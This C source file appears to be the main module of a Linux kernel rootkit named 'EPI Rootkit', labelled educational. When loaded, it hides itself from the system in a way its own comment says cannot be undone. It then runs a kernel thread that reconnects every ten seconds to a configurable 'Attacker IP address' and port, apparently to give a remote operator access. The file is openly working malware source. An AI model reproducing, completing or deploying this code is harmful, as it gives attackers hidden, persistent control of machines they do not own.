#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/init.h>
#include <linux/delay.h>

#include "rootkit.h"
#include "hide/hide.h"
#include "persistence/persistence.h"
#include "connection/client.h"

static char *ip = "127.0.0.1";
static int port = 4444;
static struct task_struct *thread;
module_param(ip, charp, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
MODULE_PARM_DESC(ip, "Attacker IP address");

module_param(port, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
MODULE_PARM_DESC(port, "Attacker port");

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Init 1");
MODULE_DESCRIPTION("EPI Rootkit - Educational Purpose");

static int __init epirootkit_init(void)
{
    printk(KERN_INFO "[epirootkit] Loading module...\n");

    deep_hide_module(THIS_MODULE);

    thread = kthread_run(attempt_connection, NULL, "kthread_p2pconnection");
    if (IS_ERR(thread)) {
        pr_info("[epirootkit]: fail to create a kthread\n");
        return -EPERM;
    }

    return 0;
}

static void __exit epirootkit_exit(void)
{
    printk(KERN_INFO "[epirootkit]: Module cleanup.\n");
    kthread_stop(thread);

    // Note : deeply hidden module cannot be unhidden
}

static int attempt_connection(void *data)
{
    while (1)
    {
        printk(KERN_INFO "[epirootkit]: Connecting to %s:%d\n", ip, port);

        connect_server(ip, port, "Welcome to epirootkit !");
        ssleep(10);
    }
    return 0;
}

module_init(epirootkit_init);
module_exit(epirootkit_exit);
